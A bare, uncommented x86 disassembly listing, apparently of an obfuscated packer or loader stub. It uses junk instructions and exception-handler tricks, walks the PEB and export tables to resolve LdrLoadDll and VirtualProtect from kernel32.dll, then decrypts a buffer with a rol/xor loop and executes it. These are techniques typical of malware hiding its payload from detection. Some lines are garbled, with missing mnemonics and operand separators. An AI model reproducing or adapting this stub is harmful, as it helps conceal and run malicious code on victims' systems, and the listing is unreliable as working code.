_start
pushad
xor ecx ecx
push esp
or eax eax
sbb ecx 0xffffffff
add esp 0x4
mov edi [ esp - 0x4 ]
or edi edi
sbb ecx 0xffffffff
sub edi 0x4
test edx edx
adc ecx 0x1
neg ecx
call $+5
sub [ edi ] ecx
retn
sub_33702033
mov edx 0x0
sub ecx ecx
add ecx edx
and eax 0x0
or eax edx
stc
sbb cl 0x0
dec cl
mov ch cl
call $+5
add [ esp ] edx
jmp [ esp ]
xor edx edx
add edx eax
inc eax
and esi 0x0
add esi [ esp ]
movzx ebx [ esi + eax - 0x2 ]
call $+5
mov [ esp ] ecx
sub ecx ebx
pop ecx
jne r-xdata
sub_337020ad
push [ fs : 0x0 ]
add esi edi
xor eax eax
xor eax 0xffff
not edx
or esi esi
adc esi edi
mov [ fs : 0x0 ] esp
and esi edx
test edi edi
adc esi edi
jmp r-xdata
call $+5
pop ecx
and ecx 0x0
or ecx [ esp ]
mov [ fs : 0x0 ] ecx
or ecx ecx
adc esp 0x8
push esi
pop edi
mov ecx 0x0
add ecx [ esi + 0x3c ]
add esi ecx
and ecx 0x0
add ecx 0x4550
and ebx 0x0
add ebx [ esi ]
sub esp 0x4
mov [ esp ] ebx
xor ebx ecx
pop ebx
jne r-xdata
jmp [ esp ]
popad
and eax 0x0
add eax 0x1
retn 0xc
mov ecx 0x0
xor ecx [ esi + 0x78 ]
mov esi 0x0
or esi ecx
add esi edi
call $+5
mov [ esp ] esi
xor ecx ecx
xor ecx [ esi + 0x20 ]
xor esi esi
xor esi ecx
and eax eax
adc esi edi
add esp 0xfffffffc
mov [ esp ] edi
sub esp 0x4
mov [ esp ] esi
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
push edx
xor edx [ esp ]
and edx edx
sbb esp 0xfffffffc
mov eax 0x0
add eax esi
and esi esi
mov ecx 0x0
adc ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
xor ebp ebp
add ebp esp
add esi ebx
push 0x6c6c
push 0x4464616f
call $+5
mov [ esp ] 0x4c72644c
xor edi edi
xor edi esp
sub ecx ecx
add ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub esi edi
xor ecx ecx
mov ecx [ esi ]
xor ebx ebx
or ebx 0x5a4d
and ecx eax
sub esp 0x4
mov [ esp ] ebx
sub ebx ecx
pop ebx
je r-xdata
xor esp esp
or esp ebp
pop esi
sub esp 0x4
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
add esp 0x4
mov edx [ esp - 0x4 ]
pop edi
mov esi [ esp ]
add esp 0x4
and eax 0x0
add eax esi
mov ecx 0x0
xor ecx [ esi + 0x24 ]
mov esi ecx
add esi edi
mov ecx 0x0
xor ecx [ esi + edx * 2 ]
and ecx 0xffff
xor edx edx
or edx ecx
and ecx 0x0
add ecx [ eax + 0x10 ]
and ebx ebx
sbb edx ecx
test ebx ebx
sbb edx 0xffffffff
mov esi 0x0
or esi [ eax + 0x1c ]
add esi edi
xor ecx ecx
xor ecx [ esi + edx * 4 ]
add edi ecx
and ebp 0x0
or ebp esp
push ecx
xor ecx [ esp ]
sub esp 0xfffffffc
sub esp 0x4
mov [ esp ] ecx
push esp
pop esi
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] 0x6c006c
sub esp 0x4
mov [ esp ] 0x64002e
push 0x320033
call $+5
mov [ esp ] 0x6c0065
add esp 0xfffffffc
mov [ esp ] 0x6e0072
push 0x65006b
push esp
sub esp 0x4
mov [ esp ] 0x1a0018
mov ebx 0x0
add ebx esp
push esi
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] ecx
call $+5
mov [ esp ] edi
call $+5
mov [ esp ] esi
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
xor eax eax
add eax [ esi ]
call $+5
mov [ esp ] eax
pop ecx
and edi edi
mov ebx 0x0
adc ebx [ fs : 0x30 ]
mov edi 0x0
add edi [ ebx + 0x10 ]
mov [ edi + 0x18 ] ecx
xor esp esp
or esp ebp
push [ fs : 0x30 ]
pop ebx
xor edi edi
add edi [ ebx + 0x10 ]
sub esi esi
add esi [ edi + 0x18 ]
mov edi 0x0
sub edi esi
neg edi
and ecx 0x0
or ecx [ esi + 0x3c ]
and edx edx
adc esi ecx
and ecx 0x0
or ecx [ esi + 0x78 ]
and esi 0x0
or esi ecx
add esi edi
add esp 0xfffffffc
mov [ esp ] esi
and esi esi
mov ecx 0x0
adc ecx [ esi + 0x20 ]
mov esi 0x0
or esi ecx
add esi edi
push edi
push esi
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
push edx
xor edx [ esp ]
add esp 0x4
mov eax 0x0
xor eax esi
xor ecx ecx
add ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
xor ebp ebp
add ebp esp
and esi esi
adc esi ebx
sub esp 0x4
mov [ esp ] 0x7463
call $+5
mov [ esp ] 0x65746f72
call $+5
mov [ esp ] 0x506c6175
add esp 0xfffffffc
mov [ esp ] 0x74726956
and edi 0x0
or edi esp
xor ecx ecx
xor ecx 0xf
[ esi ] [ edi ]
je r-xdata
inc edx
or eax eax
adc eax 0x4
and ebx ebx
mov esi 0x0
adc esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
mov esp 0x0
xor esp ebp
pop esi
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
mov edx [ esp ]
add esp 0x4
pop edi
add esp 0x4
mov esi [ esp - 0x4 ]
test edi edi
mov eax 0x0
adc eax esi
and ecx 0x0
or ecx [ esi + 0x24 ]
xor esi esi
add esi ecx
add esi edi
mov ecx 0x0
or ecx [ esi + edx * 2 ]
and ecx 0xffff
sub edx edx
add edx ecx
mov ecx 0x0
sub ecx [ eax + 0x10 ]
neg ecx
or ecx ecx
sbb edx ecx
inc edx
xor esi esi
add esi [ eax + 0x1c ]
add esi edi
and ecx 0x0
or ecx [ esi + edx * 4 ]
add edi ecx
and eax 0x0
add eax 0x1000
call $+5
pop esi
and esi 0xfffff000
add esi eax
add esi eax
add esp 0xfffffffc
mov [ esp ] esi
xor ebx ebx
add ebx 0x4
call $+5
add esi eax
mov ecx 0x0
xor ecx [ esi ]
and ecx ecx
sbb ebx 0x1
je r-xdata
and ebx ebx
adc edx 0x1
test ecx ecx
adc eax 0x4
or edx edx
mov esi 0x0
adc esi [ eax ]
and esp 0x0
or esp ebp
jmp [ esp ]
add esp 0x4
mov ecx [ esp - 0x4 ]
mov esi [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] ecx
push esp
sub esp 0x4
mov [ esp ] 0x40
add esp 0xfffffffc
mov [ esp ] 0x45c6
call $+5
mov [ esp ] esi
push edi
add esp 0xfffffffc
mov [ esp ] esi
pop esi
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
or ebx ebx
adc eax 0x19
add esp 0xfffffffc
mov [ esp ] eax
push ebp
mov ebp 0x0
or ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
sub_337024f8
add esp 0x4
mov ebx [ esp - 0x4 ]
mov edi 0x0
xor edi esi
mov eax 0xc
add edi eax
and esi 0x0
or esi edi
and ebp 0x0
add ebp edi
and ecx 0x0
or ecx 0x4524
sub edx edx
add edx ecx
call $+5
mov eax 0x0
sub eax [ esi ]
neg eax
rol al cl
call $+5
mov [ esp ] edx
xor eax [ esp ]
or edx edx
sbb esp 0xfffffffc
call $+5
mov [ esp ] ecx
and ecx 0x0
or ecx 0x40
push ecx
xor ecx ebx
pop ecx
je r-xdata
test eax eax
sbb esi 0xffffffff
mov ecx [ esp ]
add esp 0x4
sub ecx 0x1
je r-xdata
stosb [ edi ]
add esp 0x4
mov eax [ esp - 0x4 ]
call ebp
add eax ebx
or edx edx
adc ecx edx
popad
and eax 0x0
add eax 0x1
retn 0xc
jmp [ esp ]
